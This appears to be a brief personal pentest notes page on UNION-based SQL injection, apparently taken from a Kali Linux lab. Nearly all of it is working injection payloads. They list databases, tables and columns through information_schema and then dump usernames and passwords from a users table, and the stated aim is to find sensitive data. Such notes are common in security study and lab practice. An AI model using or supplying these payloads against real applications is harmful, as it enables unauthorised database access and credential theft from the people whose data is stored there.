# Listing db, table and columns

## Listing databases

' UNION select schema\_name, NULL from information\_schema.schemata-- -

<figure><img src="../../.gitbook/assets/2024-02-15 07_46_48-kali-linux-2022.4-virtualbox-amd64 [Corriendo] - Oracle VM VirtualBox _ 1.png" alt=""><figcaption></figcaption></figure>

The last command dumps all databases, we'll know try to enumerate each one of those DB's till we find some sensitive data like users or passwords.

## Listing tables:

' UNION select table\_name, NULL from information\_schema.tables where table\_schema = 'public'-- -

## Listing columns:

' UNION select NULL, column\_name from information\_schema.columns where table\_schema='DB' and table\_name='table'-- -'

<figure><img src="../../.gitbook/assets/enumerating columns sql.png" alt=""><figcaption></figcaption></figure>

## Listing data:

## Option#1

\
' union select username,password from users-- -

## Option 2

' union select NULL,group\_concat(username,';',password) from users-- -

<figure><img src="../../.gitbook/assets/2024-02-15 13_21_28-.png" alt=""><figcaption></figcaption></figure>
